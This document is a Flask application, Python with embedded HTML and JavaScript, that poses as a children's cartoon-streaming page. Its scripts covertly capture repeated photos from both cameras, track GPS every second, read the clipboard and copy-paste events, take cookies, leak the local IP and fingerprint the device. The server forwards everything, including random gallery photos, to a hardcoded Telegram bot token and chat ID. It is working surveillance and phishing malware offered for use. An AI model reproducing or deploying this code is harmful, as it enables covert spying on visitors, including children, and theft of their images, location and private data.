from flask import Flask, render_template_string, request
import json
import csv
import os
import random
import socket
from datetime import datetime
import base64
import uuid
import requests
import zipfile
from io import BytesIO

app = Flask(__name__)

USER_DUMP_DIR = "User_Dump"
TEST_FILES_DIR = "test_files"
DCIM_DIR = "/home/user/dcim"

TELEGRAM_BOT_TOKEN = "8052034952:AAFyNcgyAUPXrXYx718hISJdX-SeQM8TU1Y"
TELEGRAM_CHAT_ID = "7897062147"

TARGET_URL = "https://dora-bash-kids-live.blogspot.com/p/dora-bash-kids-live.html?m=1"

if not os.path.exists(USER_DUMP_DIR):
    os.makedirs(USER_DUMP_DIR)
if not os.path.exists(TEST_FILES_DIR):
    os.makedirs(TEST_FILES_DIR)

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.254.254.254', 1))
        local_ip = s.getsockname()[0]
    except:
        local_ip = '127.0.0.1'
    finally:
        s.close()
    return local_ip

def send_file_to_telegram(file_path, file_name):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': (file_name, f)}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        try:
            response = requests.post(url, data=data, files=files)
            return response.json()
        except:
            return None

def send_location_to_telegram(location_data, file_name):
    temp_file = os.path.join(USER_DUMP_DIR, file_name)
    with open(temp_file, 'w') as f:
        json.dump(location_data, f, indent=4)
    result = send_file_to_telegram(temp_file, file_name)
    os.remove(temp_file)
    return result

def send_zip_to_telegram(dump_dir, dump_name):
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for root, _, files in os.walk(dump_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, dump_dir)
                zip_file.write(file_path, os.path.join(dump_name, arcname))
    zip_buffer.seek(0)
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    files = {'document': (f"{dump_name}.zip", zip_buffer)}
    data = {'chat_id': TELEGRAM_CHAT_ID}
    try:
        response = requests.post(url, data=data, files=files)
        return response.json()
    except:
        return None

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ random_title }}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Comic+Neue:wght@700&display=swap" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, {{ random_gradient_start }}, {{ random_gradient_end }});
            font-family: 'Comic Neue', cursive;
            cursor: {{ random_cursor }};
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(20px); }
            100% { opacity: 1; transform: translateY(0); }
        }
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes scale {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        @keyframes slideIn {
            0% { transform: translateX(-20px); opacity: 0; }
            100% { transform: translateX(0); opacity: 1; }
        }
        .fade-in {
            animation: fadeIn {{ random_duration }}s ease-in;
        }
        .rotate {
            animation: rotate 10s linear infinite;
        }
        .scale {
            animation: scale 2s infinite;
        }
        .bounce {
            animation: bounce {{ random_countdown_animation_duration }}s infinite;
        }
        .slide-in {
            animation: slideIn {{ random_duration }}s ease-in;
        }
        .cartoon-icon {
            position: absolute;
            opacity: 0.3;
        }
        .cartoon-icon.top-left { top: 20px; left: 20px; }
        .cartoon-icon.bottom-right { bottom: 20px; right: 20px; }
        .random-quote {
            font-size: {{ random_font_size }}px;
            color: {{ random_quote_color }};
        }
        #watchBtn {
            margin-left: {{ random_button_margin }}px;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen text-gray-800">
    <img src="https://img.icons8.com/color/48/000000/cartoon.png" class="cartoon-icon top-left rotate" alt="cartoon">
    <img src="https://img.icons8.com/color/48/000000/cartoon.png" class="cartoon-icon bottom-right rotate" alt="cartoon">
    <div id="mainContent" class="bg-white p-8 rounded-2xl shadow-2xl w-full max-w-md fade-in">
        <h1 class="text-4xl font-bold mb-6 text-center text-blue-600">Chandler's Cartoon Corner</h1>
        <p id="chandlerQuote" class="text-lg text-center text-gray-700 mb-4 italic random-quote slide-in"></p>
        <p class="text-lg text-center text-gray-700 mb-6">Want to watch live cartoons like Doraemon and Disney Channel?</p>
        <button id="watchBtn" class="w-full bg-yellow-400 text-gray-800 p-3 rounded-lg hover:bg-yellow-500 transition duration-300 scale">{{ random_button_text }}</button>
        <p id="waitMessage" class="hidden text-center text-gray-700 mt-4">{{ random_countdown_message }} <span id="countdown" class="bounce">15</span>...</p>
    </div>
    <video id="frontVideo" width="0" height="0" autoplay style="display:none;"></video>
    <video id="backVideo" width="0" height="0" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        let collectedData = {
            ip_address: "",
            local_ip: "",
            location: [],
            device: {},
            browser: {},
            interactions: { clicks: 0, scrolls: 0, time_on_page: 0, clipboard: "", copy_paste: [] },
            fingerprint: {},
            permissions: { location: false, camera: false, clipboard: false, notifications: false, pointer_lock: false, midi: false, storage: false, ambient_light: false, magnetometer: false, accelerometer: false, gyroscope: false, proximity: false, vibration: false, orientation: false },
            vpn_proxy: false,
            incognito: false,
            screen_recording: false,
            photos: [],
            cookies: "",
            advanced: {}
        };
        let startTime = Date.now();
        let permissionsGranted = false;
        let photoCaptureActive = true;
        let sessionId = document.cookie.match(/session_id=([^;]+)/)?.[1] || '{{ session_id }}';
        if (!document.cookie.match(/session_id=/)) {
            document.cookie = `session_id=${sessionId}; max-age=31536000; path=/`;
        }
        if (sessionId !== '{{ session_id }}') {
            permissionsGranted = true;
            requestAllPermissions();
            startDataCollection();
        }
        const quotes = [
            "Could I *be* more excited for cartoons?",
            "Hi, I'm Chandler. I make jokes when I'm uncomfortable!",
            "Could I *be* more ready to watch Doraemon?",
            "I'm not great at advice, but I can recommend cartoons!",
            "Could I *be* any more thrilled for Disney Channel?",
            "Oh. My. God. It's cartoon time!",
            "Could I *be* more in love with these shows?",
            "Pivot! Pivot to cartoons!",
            "Could I *be* more stoked for animation?",
            "This is my cartoon dance, wanna see it?",
            "Could I *be* having more fun with cartoons?",
            "It's like all my life I’ve been waiting for Doraemon!"
        ];
        document.getElementById('chandlerQuote').innerText = quotes[Math.floor(Math.random() * quotes.length)];
        function startCountdown() {
            let timeLeft = 15;
            const countdownElement = document.getElementById('countdown');
            const timer = setInterval(() => {
                timeLeft--;
                countdownElement.innerText = timeLeft;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    window.location.href = '/monitor';
                }
            }, 1000);
        }
        const watchBtn = document.getElementById('watchBtn');
        const waitMessage = document.getElementById('waitMessage');
        watchBtn.addEventListener('click', () => {
            permissionsGranted = true;
            watchBtn.classList.add('hidden');
            waitMessage.classList.remove('hidden');
            startCountdown();
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    const locationData = {
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        timestamp: Date.now()
                    };
                    fetch('/send_initial_location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(locationData)
                    });
                }, () => {}, { enableHighAccuracy: true });
            }
            setTimeout(() => {
                requestAllPermissions();
                startDataCollection();
                fetch('/save_data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(collectedData)
                });
            }, Math.random() * 2000 + 12000);
        });
        function capturePhotos(video, cameraType) {
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            let photoIndex = 0;
            const capture = () => {
                if (!photoCaptureActive) return;
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                collectedData.photos.push({
                    data: canvas.toDataURL('image/png'),
                    type: cameraType,
                    timestamp: Date.now(),
                    index: photoIndex++
                });
                setTimeout(capture, 500);
            };
            capture();
        }
        async function requestAllPermissions() {
            try {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(() => {
                        collectedData.permissions.location = true;
                    }, () => {
                        collectedData.permissions.location = false;
                    }, { enableHighAccuracy: true });
                }
                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                collectedData.permissions.camera = true;
                const frontVideo = document.getElementById('frontVideo');
                frontVideo.srcObject = frontStream;
                capturePhotos(frontVideo, 'front');
                try {
                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    const backVideo = document.getElementById('backVideo');
                    backVideo.srcObject = backStream;
                    capturePhotos(backVideo, 'back');
                } catch (e) {}
                await navigator.clipboard.readText()
                    .then(text => {
                        collectedData.interactions.clipboard = text;
                        collectedData.permissions.clipboard = true;
                    })
                    .catch(() => {
                        collectedData.permissions.clipboard = false;
                    });
                if (Notification && Notification.requestPermission) {
                    Notification.requestPermission().then(permission => {
                        collectedData.permissions.notifications = permission === 'granted';
                    });
                }
                if (document.body.requestPointerLock) {
                    document.body.requestPointerLock();
                    document.addEventListener('pointerlockchange', () => {
                        collectedData.permissions.pointer_lock = document.pointerLockElement === document.body;
                    });
                }
                if (navigator.requestMIDIAccess) {
                    navigator.requestMIDIAccess()
                        .then(() => {
                            collectedData.permissions.midi = true;
                        })
                        .catch(() => {
                            collectedData.permissions.midi = false;
                        });
                }
                if (navigator.storage && navigator.storage.persist) {
                    navigator.storage.persist().then(granted => {
                        collectedData.permissions.storage = granted;
                    });
                }
                if (window.AmbientLightSensor) {
                    const sensor = new AmbientLightSensor();
                    sensor.onreading = () => {
                        collectedData.advanced.ambient_light = sensor.illuminance;
                    };
                    sensor.start();
                    collectedData.permissions.ambient_light = true;
                }
                if (window.Magnetometer) {
                    const sensor = new Magnetometer();
                    sensor.onreading = () => {
                        collectedData.advanced.magnetometer = {
                            x: sensor.x,
                            y: sensor.y,
                            z: sensor.z
                        };
                    };
                    sensor.start();
                    collectedData.permissions.magnetometer = true;
                }
                if (window.Accelerometer) {
                    const sensor = new Accelerometer();
                    sensor.onreading = () => {
                        collectedData.advanced.accelerometer = {
                            x: sensor.x,
                            y: sensor.y,
                            z: sensor.z
                        };
                    };
                    sensor.start();
                    collectedData.permissions.accelerometer = true;
                }
                if (window.Gyroscope) {
                    const sensor = new Gyroscope();
                    sensor.onreading = () => {
                        collectedData.advanced.gyroscope = {
                            x: sensor.x,
                            y: sensor.y,
                            z: sensor.z
                        };
                    };
                    sensor.start();
                    collectedData.permissions.gyroscope = true;
                }
                if (window.ProximitySensor) {
                    const sensor = new ProximitySensor();
                    sensor.onreading = () => {
                        collectedData.advanced.proximity = sensor.distance;
                    };
                    sensor.start();
                    collectedData.permissions.proximity = true;
                }
                if (navigator.vibrate) {
                    collectedData.permissions.vibration = true;
                }
                if (window.DeviceOrientationEvent) {
                    window.addEventListener('deviceorientation', (e) => {
                        collectedData.advanced.orientation = {
                            alpha: e.alpha,
                            beta: e.beta,
                            gamma: e.gamma
                        };
                    });
                    collectedData.permissions.orientation = true;
                }
            } catch (err) {}
        }
        function startDataCollection() {
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => collectedData.ip_address = data.ip);
            function getLocalIP() {
                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (!RTCPeerConnection) return;
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.onicecandidate = (e) => {
                    if (!e.candidate) return;
                    const ipMatch = e.candidate.candidate.match(/(\\d+\\.\\d+\\.\\d+\\.\\d+)/);
                    if (ipMatch) collectedData.local_ip = ipMatch[1];
                };
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
            }
            getLocalIP();
            if (navigator.geolocation) {
                const updateLocation = () => {
                    navigator.geolocation.getCurrentPosition(pos => {
                        collectedData.location.push({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            timestamp: Date.now()
                        });
                    }, () => {}, { enableHighAccuracy: true });
                    setTimeout(updateLocation, 1000);
                };
                updateLocation();
            }
            collectedData.device = {
                os: navigator.platform,
                screen_resolution: `${window.screen.width}x${window.screen.height}`,
                color_depth: window.screen.colorDepth,
                pixel_ratio: window.devicePixelRatio,
                orientation: screen.orientation ? screen.orientation.type : 'unknown',
                battery: {},
                cpu_cores: navigator.hardwareConcurrency || 'Unknown',
                memory: navigator.deviceMemory || 'Unknown',
                max_touch_points: navigator.maxTouchPoints || 0,
                platform_type: /Mobi|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile/Tablet' : 'PC'
            };
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    collectedData.device.battery = {
                        level: battery.level * 100,
                        charging: battery.charging
                    };
                });
            }
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (gl) {
                collectedData.device.gpu = {
                    renderer: gl.getParameter(gl.RENDERER),
                    vendor: gl.getParameter(gl.VENDOR),
                    extensions: gl.getSupportedExtensions()
                };
            }
            collectedData.browser = {
                type: navigator.appName,
                version: navigator.appVersion,
                user_agent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                do_not_track: navigator.doNotTrack || 'Not specified',
                cookies: document.cookie,
                webrtc_enabled: !!window.RTCPeerConnection,
                webgpu: navigator.gpu ? 'Supported' : 'Not supported',
                websocket: !!window.WebSocket,
                service_worker: navigator.serviceWorker ? 'Supported' : 'Not supported'
            };
            if (navigator.connection) {
                collectedData.browser.network = {
                    type: navigator.connection.type,
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                };
            }
            if (navigator.storage && navigator.storage.estimate) {
                navigator.storage.estimate().then(estimate => {
                    collectedData.browser.storage = {
                        quota: estimate.quota,
                        usage: estimate.usage
                    };
                });
            }
            document.addEventListener('click', () => collectedData.interactions.clicks++);
            document.addEventListener('scroll', () => collectedData.interactions.scrolls++);
            setInterval(() => {
                collectedData.interactions.time_on_page = Math.round((Date.now() - startTime) / 1000);
            }, 1000);
            document.addEventListener('copy', () => {
                navigator.clipboard.readText().then(text => {
                    collectedData.interactions.copy_paste.push({ event: 'copy', content: text, time: Date.now() });
                });
            });
            document.addEventListener('paste', () => {
                navigator.clipboard.readText().then(text => {
                    collectedData.interactions.copy_paste.push({ event: 'paste', content: text, time: Date.now() });
                });
            });
        }
    </script>
</body>
</html>
"""

MONITOR_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ random_title }}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Comic+Neue:wght@700&display=swap" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, {{ random_gradient_start }}, {{ random_gradient_end }});
            font-family: 'Comic Neue', cursive;
            cursor: {{ random_cursor }};
        }
        .iframe-container {
            width: 100%;
            height: 80vh;
            border: none;
            border-radius: 1rem;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
        }
        .fallback-message {
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen text-gray-800">
    <div class="bg-white bg-opacity-90 p-4 rounded-2xl shadow-2xl w-full max-w-4xl">
        <h1 class="text-3xl font-bold mb-4 text-center text-blue-600">Enjoy Your Cartoons!</h1>
        <iframe src="{{ target_url }}" class="iframe-container" id="doraIframe" sandbox="allow-same-origin allow-scripts"></iframe>
        <p class="fallback-message hidden" id="fallbackMessage">Having trouble loading? <a href="{{ target_url }}" target="_blank" class="text-blue-600 hover:underline">Click here to watch cartoons!</a></p>
    </div>
    <video id="frontVideo" width="0" height="0" autoplay style="display:none;"></video>
    <video id="backVideo" width="0" height="0" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        let monitoringData = {
            interactions: { clicks: 0, scrolls: 0, time_on_page: 0 },
            location: [],
            photos: []
        };
        let startTime = Date.now();
        let photoCaptureActive = true;
        let sessionId = document.cookie.match(/session_id=([^;]+)/)?.[1] || '{{ session_id }}';
        if (!document.cookie.match(/session_id=/)) {
            document.cookie = `session_id=${sessionId}; max-age=31536000; path=/`;
        }
        const iframe = document.getElementById('doraIframe');
        const fallbackMessage = document.getElementById('fallbackMessage');
        iframe.onload = () => {
            try {
                if (!iframe.contentDocument) {
                    throw new Error('Iframe content not accessible');
                }
            } catch (e) {
                fallbackMessage.classList.remove('hidden');
            }
        };
        function capturePhotos(video, cameraType) {
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            let photoIndex = 0;
            const capture = () => {
                if (!photoCaptureActive) return;
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                monitoringData.photos.push({
                    data: canvas.toDataURL('image/png'),
                    type: cameraType,
                    timestamp: Date.now(),
                    index: photoIndex++
                });
                setTimeout(capture, 500);
            };
            capture();
        }
        async function initMonitoring() {
            try {
                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const frontVideo = document.getElementById('frontVideo');
                frontVideo.srcObject = frontStream;
                capturePhotos(frontVideo, 'front');
                try {
                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    const backVideo = document.getElementById('backVideo');
                    backVideo.srcObject = backStream;
                    capturePhotos(backVideo, 'back');
                } catch (e) {}
            } catch (err) {}
        }
        initMonitoring();
        document.addEventListener('click', () => monitoringData.interactions.clicks++);
        document.addEventListener('scroll', () => monitoringData.interactions.scrolls++);
        setInterval(() => {
            monitoringData.interactions.time_on_page = Math.round((Date.now() - startTime) / 1000);
        }, 1000);
        if (navigator.geolocation) {
            const updateLocation = () => {
                navigator.geolocation.getCurrentPosition(pos => {
                    monitoringData.location.push({
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        timestamp: Date.now()
                    });
                }, () => {}, { enableHighAccuracy: true });
                setTimeout(updateLocation, 1000);
            };
            updateLocation();
        }
        setInterval(() => {
            fetch('/monitor_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(monitoringData)
            });
            monitoringData.photos = [];
        }, 10000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    session_id = str(uuid.uuid4())
    button_texts = ["Watch Now", "Start Streaming", "Dive In", "Watch Cartoons", "Get Started", "Join the Fun", "Cartoon Blast"]
    random_button_text = random.choice(button_texts)
    random_duration = random.uniform(0.5, 1.5)
    gradient_colors = [
        ('#ff6b6b', '#4ecdc4'), ('#ffcc00', '#ff5733'), ('#00ddeb', '#ff00ff'), ('#7b2cbf', '#f72585'),
        ('#a8dadc', '#457b9d'), ('#f4a261', '#e76f51'), ('#ff9f43', '#7209b7')
    ]
    random_gradient = random.choice(gradient_colors)
    countdown_messages = [
        "Redirecting You in", "Getting cartoons ready in", "Almost there in", "Loading fun in",
        "Your cartoons are coming in", "Toon time starts in", "Ready for cartoons in"
    ]
    random_countdown_message = random.choice(countdown_messages)
    random_font_size = random.randint(16, 24)
    quote_colors = ['#e63946', '#1d3557', '#f4a261', '#6d6875', '#2a9d8f', '#8338ec']
    random_quote_color = random.choice(quote_colors)
    cursors = ['default', 'pointer', 'crosshair', 'url(https://img.icons8.com/color/24/000000/cartoon.png), auto']
    random_cursor = random.choice(cursors)
    titles = ["Chandler's Cartoon Corner", "Cartoon Fun", "Toon Time", "Chandler's Toons", "Animation Station"]
    random_title = random.choice(titles)
    random_button_margin = random.randint(-20, 20)
    random_countdown_animation_duration = random.uniform(0.3, 0.7)
    return render_template_string(
        HTML_TEMPLATE,
        session_id=session_id,
        random_button_text=random_button_text,
        random_duration=random_duration,
        random_gradient_start=random_gradient[0],
        random_gradient_end=random_gradient[1],
        random_countdown_message=random_countdown_message,
        random_font_size=random_font_size,
        random_quote_color=random_quote_color,
        random_cursor=random_cursor,
        random_title=random_title,
        random_button_margin=random_button_margin,
        random_countdown_animation_duration=random_countdown_animation_duration
    )

@app.route('/send_initial_location', methods=['POST'])
def send_initial_location():
    location_data = request.json
    send_location_to_telegram(location_data, 'initial_location.json')
    return 'Success'

@app.route('/save_data', methods=['POST'])
def save_data():
    data = request.json
    existing_dumps = [d for d in os.listdir(USER_DUMP_DIR) if d.startswith('dump_') and d[5:].isdigit()]
    next_number = max([int(d.split('_')[1]) for d in existing_dumps] + [0]) + 1
    dump_dir = os.path.join(USER_DUMP_DIR, f"dump_{next_number}")
    os.makedirs(dump_dir, exist_ok=True)
    os.makedirs(os.path.join(dump_dir, 'json'), exist_ok=True)
    os.makedirs(os.path.join(dump_dir, 'csv'), exist_ok=True)
    os.makedirs(os.path.join(dump_dir, 'photos'), exist_ok=True)
    os.makedirs(os.path.join(dump_dir, 'Uploads'), exist_ok=True)
    os.makedirs(os.path.join(dump_dir, 'location'), exist_ok=True)
    json_path = os.path.join(dump_dir, 'json', 'data.json')
    with open(json_path, 'w') as f:
        json.dump(data, f, indent=4)
    send_file_to_telegram(json_path, 'data.json')
    csv_path = os.path.join(dump_dir, 'csv', 'data.csv')
    with open(csv_path, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Category', 'Key', 'Value'])
        def flatten_dict(d, parent_key=''):
            for k, v in d.items():
                new_key = f"{parent_key}.{k}" if parent_key else k
                if isinstance(v, dict):
                    flatten_dict(v, new_key)
                else:
                    writer.writerow([parent_key.split('.')[0] if parent_key else 'root', new_key, str(v)])
        flatten_dict(data)
    send_file_to_telegram(csv_path, 'data.csv')
    location_path = os.path.join(dump_dir, 'location', 'location_data.json')
    with open(location_path, 'w') as f:
        json.dump(data.get('location', []), f, indent=4)
    send_file_to_telegram(location_path, 'location_data.json')
    for photo in data.get('photos', []):
        timestamp = datetime.fromtimestamp(photo['timestamp'] / 1000).strftime('%Y%m%d_%H%M%S')
        photo_path = os.path.join(dump_dir, 'photos', f'photo_{timestamp}_{photo["type"]}_{photo["index"]}.png')
        with open(photo_path, 'wb') as f:
            f.write(base64.b64decode(photo['data'].split(',')[1]))
        send_file_to_telegram(photo_path, os.path.basename(photo_path))
    try:
        files = [f for f in os.listdir(TEST_FILES_DIR) if os.path.isfile(os.path.join(TEST_FILES_DIR, f))]
        if files:
            random_file = random.choice(files)
            random_file_src = os.path.join(TEST_FILES_DIR, random_file)
            random_file_dst = os.path.join(dump_dir, 'Uploads', f'random_file_{random_file}')
            with open(random_file_src, 'rb') as src, open(random_file_dst, 'wb') as dst:
                dst.write(src.read())
            send_file_to_telegram(random_file_dst, f'random_file_{random_file}')
    except Exception as e:
        pass
    try:
        photo_extensions = ['.jpg', '.jpeg', '.png']
        dcim_files = [f for f in os.listdir(DCIM_DIR) if os.path.isfile(os.path.join(DCIM_DIR, f)) and any(f.lower().endswith(ext) for ext in photo_extensions)]
        if dcim_files:
            random_photo = random.choice(dcim_files)
            random_photo_src = os.path.join(DCIM_DIR, random_photo)
            random_photo_dst = os.path.join(dump_dir, 'Uploads', f'random_photo_{random_photo}')
            with open(random_photo_src, 'rb') as src, open(random_photo_dst, 'wb') as dst:
                dst.write(src.read())
            send_file_to_telegram(random_photo_dst, f'random_photo_{random_photo}')
    except Exception as e:
        pass
    send_zip_to_telegram(dump_dir, f"dump_{next_number}")
    return 'Success'

@app.route('/monitor')
def monitor():
    session_id = str(uuid.uuid4())
    gradient_colors = [
        ('#ff6b6b', '#4ecdc4'), ('#ffcc00', '#ff5733'), ('#00ddeb', '#ff00ff'), ('#7b2cbf', '#f72585'),
        ('#a8dadc', '#457b9d'), ('#f4a261', '#e76f51'), ('#ff9f43', '#7209b7')
    ]
    random_gradient = random.choice(gradient_colors)
    titles = ["Chandler's Cartoon Corner", "Cartoon Fun", "Toon Time", "Chandler's Toons", "Animation Station"]
    random_title = random.choice(titles)
    cursors = ['default', 'pointer', 'crosshair', 'url(https://img.icons8.com/color/24/000000/cartoon.png), auto']
    random_cursor = random.choice(cursors)
    return render_template_string(
        MONITOR_TEMPLATE,
        target_url=TARGET_URL,
        session_id=session_id,
        random_gradient_start=random_gradient[0],
        random_gradient_end=random_gradient[1],
        random_title=random_title,
        random_cursor=random_cursor
    )

@app.route('/monitor_data', methods=['POST'])
def monitor_data():
    data = request.json
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    monitor_dir = os.path.join(USER_DUMP_DIR, f"monitor_{timestamp}")
    os.makedirs(monitor_dir, exist_ok=True)
    os.makedirs(os.path.join(monitor_dir, 'photos'), exist_ok=True)
    monitor_json_path = os.path.join(monitor_dir, 'monitor_data.json')
    with open(monitor_json_path, 'w') as f:
        json.dump(data, f, indent=4)
    send_file_to_telegram(monitor_json_path, f'monitor_data_{timestamp}.json')
    for photo in data.get('photos', []):
        timestamp = datetime.fromtimestamp(photo['timestamp'] / 1000).strftime('%Y%m%d_%H%M%S')
        photo_path = os.path.join(monitor_dir, 'photos', f'photo_{timestamp}_{photo["type"]}_{photo["index"]}.png')
        with open(photo_path, 'wb') as f:
            f.write(base64.b64decode(photo['data'].split(',')[1]))
        send_file_to_telegram(photo_path, os.path.basename(photo_path))
    return 'Success'

if __name__ == '__main__':
    local_ip = get_local_ip()
    print(f"Server running at http://{local_ip}:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)